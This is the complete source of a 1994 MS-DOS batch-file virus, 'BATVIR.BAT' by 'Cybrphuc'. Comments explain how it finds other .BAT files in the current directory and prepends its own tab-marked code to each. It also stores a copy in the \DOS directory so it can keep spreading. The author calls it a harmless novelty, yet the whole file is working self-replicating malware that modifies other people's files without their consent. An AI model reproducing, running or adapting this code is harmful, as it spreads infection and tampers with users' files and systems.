@echo off
rem   ************************************************************
rem   *  BATVIR.BAT, by CYBRPHUC '94                             *
rem   *                                                          *
rem   * "BATVIR.BAT" is a bona fide batch file virus.  When      *
rem   * executed, it will infect any batch files in the current  *
rem   * directory (except itself, of course).  Infected files    *
rem   * grow by about 700 bytes and run much more slowly if      *
rem   * many other batch files are in the current directory.     *
rem   * Other than this, BATVIR is a harmless and completely     *
rem   * transparent.  BATVIR requires MS-DOS 5.0 or compatible,  *
rem   * the pipe FIND, and a few KB of free hard drive space to  *
rem   * function properly.  Actually infecting a file also       *
rem   * BATVIR (or the already-infected file) was executed       *
rem   * without an extension, and that a little bit of DOS's     *
rem   * environment space is available.  Files may be            *
rem   * re-infected, but their size will not increase any more.  *
rem   *                                                          *
rem   *   BATVIR is intended soley as a novelty item, I'm not    *
rem   * into that warfare stuff.  It was created as a fun        *
rem   * experiment and novelty for programmers.                  *
rem   *                                                          *
rem   * This clever little program is the product of much labor, *
rem   * so don't steal my work!            -Cybrphuc             *
rem   ************************************************************

rem ***********
rem These lines are shared by both this file and its subroutine
		@echo off
		break off

rem Make sure there's something to infect:
	if not exist *.bat goto #@0

rem ***********
rem Determine if the parent batch file is accessible: (set %~% to the filename)
rem (The virus will not work if the file was executed with an extension.  This
rem is because the INFECT subroutine requires a filename with no extension.)
	if exist %0.bat goto #@1
	if exist %0 goto #@0

rem ***********
rem It's being executed from another directory; check to see if another virus
rem left its code in the DOS directory. if so, use that
	if not exist \dos\#pg94.~ goto #@0
	copy \dos\#pg94.~ .
	goto #@2

	:#@1
rem ***********
rem Isolate the virus material in the parent into a temp file:
	type %0.bat|find "	">#pg94.~
rem Put it in the DOS directory too, so other infected files can use it if
rem they need it:
	if exist \dos\*.* if not exist \dos\#pg94.~ copy #pg94.~ \dos>nul

	:#@2
rem ***********
rem Create the infection subroutine

rem Since the "type %~% ..." line will also be copied, we must skip it later:
	set #=h
rem Make sure there's some free environment space
	if `%#%==` goto #@0
		if `%#%==` goto #@3
type %0.bat|find "		">#pg94.bat
		:#@3
	set #=

rem ***********
rem Infect all .BAT files in current directory using infect.bat
rem (The subroutine's name MUST be capitalized!)

	for %%p in (*.bat) do call #PG94 %%p %0

rem We could try this with C:\ and C:\DOS, but how would you create the 
rem   temp files?

rem ***********
rem Let's get outta here!
	goto #@0

rem ***********
rem This is a subroutine for infecting files:
		if not exist %1 goto #@4

rem Don't infect your parent or yourself:
rem (self is %0, being infected is %1, parent is %2, 
rem   "for" is case insensitive when wildcard is present)
		for %%g in (%0.BAT,%2.B?T) do if %%g==%1 goto #@4

		type %1|find/v "	">#pg94.~~
		type #pg94.~>%1
		type #pg94.~~>>%1
rem For speed (yeah, right!), #pg94.~~ will be deleted by the main program
		:#@4

	:#@0
rem ***********
rem Clean up your mess
	if exist #pg94.* del #pg94.*

rem ***********
rem The virus's work is done; resume normal batch file operation!
	break on
	
rem			Ha ha ha!  Cybrphuc '94
	
	echo on
